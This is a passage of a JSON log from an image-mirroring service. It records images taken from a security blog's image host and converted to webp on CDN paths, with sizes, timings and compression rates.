KB","compressRate":"35.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/6342e33b-1c0d-41c5-9a2f-8fc3e8e5c451.png-w331s","sourceStatusCode":200,"destWidth":667,"destHeight":161,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn14@2020_4/2020/08/24/21-14-57-195_fd12988740479b99.webp","sourceBytes":3599,"destBytes":22436,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1121,"convertSpendMs":12,"createdTime":"2020-08-25 05:14:56","host":"us-029*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.5 KB","destSize":"21.9 KB","compressRate":"623.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/a2dea15e-db9c-453b-be02-9e8e246c1c48.png-w331s","sourceStatusCode":200,"destWidth":1835,"destHeight":811,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn17@2020_5/2020/08/24/21-14-56-556_3ba6b975f022eccb.webp","sourceBytes":96445,"destBytes":121738,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1980,"convertSpendMs":82,"createdTime":"2020-08-25 05:14:56","host":"europe-22*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"94.2 KB","destSize":"118.9 KB","compressRate":"126.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/a4e7ce99-3d0b-4d0f-a4bf-bea9dada1416.png-w331s","sourceStatusCode":200,"destWidth":1063,"destHeight":970,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn46@2020_3/2020/08/24/21-14-57-071_64b76af9962a2522.webp","sourceBytes":55338,"destBytes":89672,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1718,"convertSpendMs":164,"createdTime":"2020-08-25 05:14:56","host":"us-52*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"54 KB","destSize":"87.6 KB","compressRate":"162%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/aa58b1ee-630b-4f2b-962f-9b0390559704.png-w331s","sourceStatusCode":200,"destWidth":1187,"destHeight":340,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn89@2020_2/2020/08/24/21-14-57-196_5c581fc1453e4a5e.webp","sourceBytes":48119,"destBytes":53170,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1383,"convertSpendMs":23,"createdTime":"2020-08-25 05:14:56","host":"us-038*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"47 KB","destSize":"51.9 KB","compressRate":"110.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/6a07cab3-67ca-4c9c-aa31-5ce6b3f927bc.png-w331s","sourceStatusCode":200,"destWidth":1872,"destHeight":837,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn94@2020_2/2020/08/24/21-14-57-040_570a755efeb4ab82.webp","sourceBytes":106529,"destBytes":151162,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1364,"convertSpendMs":58,"createdTime":"2020-08-25 05:14:56","host":"us-025*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"104 KB","destSize":"147.6 KB","compressRate":"141.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/886e58b7-c7bb-483b-9c3c-5436eecafc5f.png-w331s","sourceStatusCode":200,"destWidth":1834,"destHeight":845,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn1@2020_1/2020/08/24/21-14-57-198_6d622fe08034204b.webp","sourceBytes":110156,"destBytes":127084,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1270,"convertSpendMs":63,"createdTime":"2020-08-25 05:14:56","host":"us-001*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"107.6 KB","destSize":"124.1 KB","compressRate":"115.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/480c625a-a014-452d-a009-8477877a0a2d.png-w331s","sourceStatusCode":200,"destWidth":901,"destHeight":383,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn62@2020_2/2020/08/24/21-14-56-965_7ee22e8ed4edbc0a.webp","sourceBytes":27320,"destBytes":34660,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1488,"convertSpendMs":14,"createdTime":"2020-08-25 05:14:56","host":"europe68*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"26.7 KB","destSize":"33.8 KB","compressRate":"126.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/9821afb8-49b0-4b7a-a480-32d5d8488e56.png-w331s","sourceStatusCode":200,"destWidth":1882,"destHeight":980,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn58@2020_1/2020/08/24/21-14-57-076_1de9ab1a2d3ae59e.webp","sourceBytes":343298,"destBytes":144232,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1695,"convertSpendMs":120,"createdTime":"2020-08-25 05:14:56","host":"us-005*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"335.3 KB","destSize":"140.9 KB","compressRate":"42%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/1a8a5123-db20-420f-99dd-dbf882228e85.png-w331s","sourceStatusCode":200,"destWidth":738,"destHeight":658,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn18@2020_6/2020/08/24/21-14-57-387_52fa4a67c7556ce1.webp","sourceBytes":35038,"destBytes":40418,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1267,"convertSpendMs":37,"createdTime":"2020-08-25 05:14:56","host":"us-017*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"34.2 KB","destSize":"39.5 KB","compressRate":"115.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/d466118d-e01a-45ba-b2f9-c2b5d345c8f8.png-w331s","sourceStatusCode":200,"destWidth":1724,"destHeight":908,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn42@2020_4/2020/08/24/21-14-56-814_62df36c7ec8ef6f6.webp","sourceBytes":86495,"destBytes":94196,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1854,"convertSpendMs":45,"createdTime":"2020-08-25 05:14:56","host":"europe64*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"84.5 KB","destSize":"92 KB","compressRate":"108.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/325d13a1-1e91-4a39-a883-d3bdd3395543.png-w331s","sourceStatusCode":200,"destWidth":1166,"destHeight":883,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn73@2020_6/2020/08/24/21-14-57-182_6326c1438a984f18.webp","sourceBytes":66519,"destBytes":72090,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1488,"convertSpendMs":142,"createdTime":"2020-08-25 05:14:56","host":"us-021*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"65 KB","destSize":"70.4 KB","compressRate":"108.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/f351fbe2-e26f-4b1b-902b-5dc0af2d59cc.png-w331s","sourceStatusCode":200,"destWidth":1890,"destHeight":869,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn33@2020_6/2020/08/24/21-14-56-891_e64ff545f4b890ec.webp","sourceBytes":120049,"destBytes":84638,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2037,"convertSpendMs":138,"createdTime":"2020-08-25 05:14:56","host":"us-013*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"117.2 KB","destSize":"82.7 KB","compressRate":"70.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/24bb2b81-40e0-4943-9051-e6df9cda48da.png-w331s","sourceStatusCode":200,"destWidth":1512,"destHeight":1019,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn21@2020_3/2020/08/24/21-14-57-383_f443a2d4345597d1.webp","sourceBytes":98771,"destBytes":103476,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1412,"convertSpendMs":82,"createdTime":"2020-08-25 05:14:56","host":"us-005*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"96.5 KB","destSize":"101.1 KB","compressRate":"104.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/cce62d13-ea57-4e1b-98f4-a7f17079ee75.png-w331s","sourceStatusCode":200,"destWidth":1819,"destHeight":876,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn54@2020_5/2020/08/24/21-14-57-288_b36ce0f0a12d7d90.webp","sourceBytes":103480,"destBytes":128588,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1879,"convertSpendMs":233,"createdTime":"2020-08-25 05:14:56","host":"us-017*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"101.1 KB","destSize":"125.6 KB","compressRate":"124.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/534c4fbf-6deb-4a8d-ad1a-137a36b3ecec.png-w331s","sourceStatusCode":200,"destWidth":1758,"destHeight":787,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn97@2020_2/2020/08/24/21-14-57-478_b2d47a55da83c946.webp","sourceBytes":80084,"destBytes":98492,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1561,"convertSpendMs":126,"createdTime":"2020-08-25 05:14:56","host":"us-013*","referer":"https://blog.knownsec.com/?p=5031","linkMd5ListStr":"4b26291a0ec99cf126b9bcc0d9c59c35","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"78.2 KB","destSize":"96.2 KB","compressRate":"123%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/4a818166-1cfd-4f8b-8f1e-d5c01ca62cc7.png-w331s","sourceStatusCode":200,"destWidth":642,"destHeight":792,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn85@2020_4/2020/08/24/21-14-57-160_f6b7af172fe240c9.webp","sourceBytes":56283,"destBytes":25270,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1574,"convertSpendMs":17,"createdTime":"2020-08-25 05:14:56","host":"europe-60*","referer":"https://blog.knownsec.com/?p=5029","linkMd5ListStr":"00b4fc44d295b8070944202e12783d61","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"55 KB","destSize":"24.7 KB","compressRate":"44.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/1777783f-47e2-499f-8801-75192e9e9184.png-w331s","sourceStatusCode":200,"destWidth":1848,"destHeight":602,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn81@2020_5/2020/08/24/21-14-57-100_bfa6dc5f999ae854.webp","sourceBytes":81754,"destBytes":95544,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1760,"convertSpendMs":40,"createdTime":"2020-08-25 05:14:56","host":"europe-22*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"79.8 KB","destSize":"93.3 KB","compressRate":"116.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/9df18fdc-89a0-4e5f-8c47-e4d6937db81a.png-w331s","sourceStatusCode":200,"destWidth":2183,"destHeight":999,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn33@2020_2/2020/08/24/21-14-57-510_c16233cea68d6e54.webp","sourceBytes":174472,"destBytes":145634,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1407,"convertSpendMs":91,"createdTime":"2020-08-25 05:14:57","host":"us-034*","referer":"https://blog.knownsec.com/?p=5037","linkMd5ListStr":"23161d8db2ce524c7b61906d36af8d85","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"170.4 KB","destSize":"142.2 KB","compressRate":"83.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/733df2f7-8b9c-490e-b8f9-85f311e08ce0.png-w331s","sourceStatusCode":200,"destWidth":1664,"destHeight":406,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn58@2020_6/2020/08/24/21-14-57-753_a292a8c8813b3b62.webp","sourceBytes":75486,"destBytes":46008,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1172,"convertSpendMs":25,"createdTime":"2020-08-25 05:14:57","host":"us-025*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"73.7 KB","destSize":"44.9 KB","compressRate":"60.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/9b5e40a0-1388-4093-b47c-70499ab8624e.png-w331s","sourceStatusCode":200,"destWidth":1258,"destHeight":730,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn54@2020_5/2020/08/24/21-14-57-728_5020103e458a0719.webp","sourceBytes":60785,"destBytes":84990,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1309,"convertSpendMs":32,"createdTime":"2020-08-25 05:14:57","host":"us-038*","referer":"https://blog.knownsec.com/?p=5037","linkMd5ListStr":"23161d8db2ce524c7b61906d36af8d85","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"59.4 KB","destSize":"83 KB","compressRate":"139.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/5cae5229-0b1f-422f-99b6-78fe62f4acaf.png-w331s","sourceStatusCode":200,"destWidth":1862,"destHeight":864,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn66@2020_3/2020/08/24/21-14-57-306_1ab1ca325acc58b1.webp","sourceBytes":105183,"destBytes":117120,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2051,"convertSpendMs":64,"createdTime":"2020-08-25 05:14:56","host":"europe-56*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"102.7 KB","destSize":"114.4 KB","compressRate":"111.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/59b642e4-4f61-475b-bb8e-d207923bcc2c.png-w331s","sourceStatusCode":200,"destWidth":1384,"destHeight":202,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn76@2020_5/2020/08/24/21-14-57-931_e05dd2fe7c8210a2.webp","sourceBytes":83404,"destBytes":28754,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1131,"convertSpendMs":25,"createdTime":"2020-08-25 05:14:57","host":"us-55*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"81.4 KB","destSize":"28.1 KB","compressRate":"34.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/8e9399b4-1ef4-4117-bf48-6578517ca95a.png-w331s","sourceStatusCode":200,"destWidth":1051,"destHeight":646,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn42@2020_2/2020/08/24/21-14-57-940_1c0f3dde2bd22f81.webp","sourceBytes":45133,"destBytes":69700,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1562,"convertSpendMs":160,"createdTime":"2020-08-25 05:14:57","host":"us-009*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"44.1 KB","destSize":"68.1 KB","compressRate":"154.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/a211eac5-cd73-4401-ad71-a8f3161e756d.png-w331s","sourceStatusCode":200,"destWidth":1830,"destHeight":851,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn66@2020_4/2020/08/24/21-14-57-878_93d1be2a5276cc4a.webp","sourceBytes":125655,"destBytes":137470,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1356,"convertSpendMs":50,"createdTime":"2020-08-25 05:14:57","host":"us-001*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"122.7 KB","destSize":"134.2 KB","compressRate":"109.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/5d933ff8-0723-4eb7-b743-ed9ab2f2e105.png-w331s","sourceStatusCode":200,"destWidth":1844,"destHeight":833,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn25@2020_2/2020/08/24/21-14-57-563_dee726451450f927.webp","sourceBytes":104733,"destBytes":126352,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1815,"convertSpendMs":50,"createdTime":"2020-08-25 05:14:57","host":"europe68*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"102.3 KB","destSize":"123.4 KB","compressRate":"120.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/788eed7c-a7c5-40a9-a8ad-8ecaeef41d87.png-w331s","sourceStatusCode":200,"destWidth":1846,"destHeight":856,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn29@2020_1/2020/08/24/21-14-57-340_363e5b0a99707441.webp","sourceBytes":131996,"destBytes":140912,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1832,"convertSpendMs":67,"createdTime":"2020-08-25 05:14:57","host":"europe-56*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"128.9 KB","destSize":"137.6 KB","compressRate":"106.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/91f9fa35-1d65-42d0-b94e-898974c83ed8.png-w331s","sourceStatusCode":200,"destWidth":1416,"destHeight":1306,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn80@2020_1/2020/08/24/21-14-57-976_65fbe10dae07deac.webp","sourceBytes":203255,"destBytes":176652,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1304,"convertSpendMs":84,"createdTime":"2020-08-25 05:14:57","host":"us-034*","referer":"https://blog.knownsec.com/?p=5029","linkMd5ListStr":"00b4fc44d295b8070944202e12783d61","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"198.5 KB","destSize":"172.5 KB","compressRate":"86.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/cd49add1-41a1-4fb0-87d0-3b54c17ac379.png-w331s","sourceStatusCode":200,"destWidth":1850,"destHeight":680,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn10@2020_3/2020/08/24/21-14-58-038_b6d79a09337d2603.webp","sourceBytes":88176,"destBytes":106602,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2098,"convertSpendMs":81,"createdTime":"2020-08-25 05:14:56","host":"us-52*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"86.1 KB","destSize":"104.1 KB","compressRate":"120.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/014b8782-9bb1-4341-9bf4-ba699e42f861.png-w331s","sourceStatusCode":200,"destWidth":911,"destHeight":639,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn50@2020_3/2020/08/24/21-14-57-771_4385f54a4371e980.webp","sourceBytes":36955,"destBytes":43492,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1578,"convertSpendMs":19,"createdTime":"2020-08-25 05:14:57","host":"europe-60*","referer":"https://blog.knownsec.com/?p=5031","linkMd5ListStr":"4b26291a0ec99cf126b9bcc0d9c59c35","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"36.1 KB","destSize":"42.5 KB","compressRate":"117.7%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/7c68ef39-f0d4-4a10-9fde-be772c0b7705.png-w331s","sourceStatusCode":200,"destWidth":969,"destHeight":911,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn45@2020_1/2020/08/24/21-14-57-755_5526181a054ee0ae.webp","sourceBytes":48038,"destBytes":54082,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1704,"convertSpendMs":28,"createdTime":"2020-08-25 05:14:57","host":"europe-22*","referer":"https://blog.knownsec.com/?p=5031","linkMd5ListStr":"4b26291a0ec99cf126b9bcc0d9c59c35","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"46.9 KB","destSize":"52.8 KB","compressRate":"112.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/e17e9d81-839e-4078-a6a7-1ee5212b88db.png-w331s","sourceStatusCode":200,"destWidth":1858,"destHeight":842,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn38@2020_1/2020/08/24/21-14-58-222_5944825478ab5b73.webp","sourceBytes":103231,"destBytes":109608,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1934,"convertSpendMs":517,"createdTime":"2020-08-25 05:14:57","host":"us-021*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"100.8 KB","destSize":"107 KB","compressRate":"106.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/a8abc00f-847f-4f19-bfef-90797f84c145.png-w331s","sourceStatusCode":200,"destWidth":1398,"destHeight":620,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn7@2020_5/2020/08/24/21-14-58-370_9aa67896196dcf04.webp","sourceBytes":218200,"destBytes":72490,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1255,"convertSpendMs":37,"createdTime":"2020-08-25 05:14:58","host":"us-032*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"213.1 KB","destSize":"70.8 KB","compressRate":"33.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/76dd1a62-0030-4de7-8390-b3ac88691965.png-w331s","sourceStatusCode":200,"destWidth":1804,"destHeight":855,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn62@2020_5/2020/08/24/21-14-58-317_27a401889cb227ea.webp","sourceBytes":94248,"destBytes":89744,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1815,"convertSpendMs":231,"createdTime":"2020-08-25 05:14:57","host":"us-013*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"92 KB","destSize":"87.6 KB","compressRate":"95.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/c80672ed-1c47-439f-b0f7-fea62692384a.png-w331s","sourceStatusCode":200,"destWidth":1389,"destHeight":187,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn87@2020_2/2020/08/24/21-14-58-444_7a86c937b03091fa.webp","sourceBytes":83655,"destBytes":28828,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1511,"convertSpendMs":21,"createdTime":"2020-08-25 05:14:57","host":"us-020*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx14","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"81.7 KB","destSize":"28.2 KB","compressRate":"34.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/ced3c3bc-76c0-4109-9e9e-5e9ec40084b1.png-w331s","sourceStatusCode":200,"destWidth":1864,"destHeight":915,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn15@2020_6/2020/08/24/21-14-58-428_6d483b57a5a67aa9.webp","sourceBytes":116058,"destBytes":145248,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1296,"convertSpendMs":56,"createdTime":"2020-08-25 05:14:58","host":"us-012*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"113.3 KB","destSize":"141.8 KB","compressRate":"125.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/0006a9e3-ab96-4dbe-bac3-fc90f7f156f0.png-w331s","sourceStatusCode":200,"destWidth":1839,"destHeight":832,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn72@2020_5/2020/08/24/21-14-58-086_65ef6fc1527a6078.webp","sourceBytes":95020,"destBytes":100230,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1751,"convertSpendMs":51,"createdTime":"2020-08-25 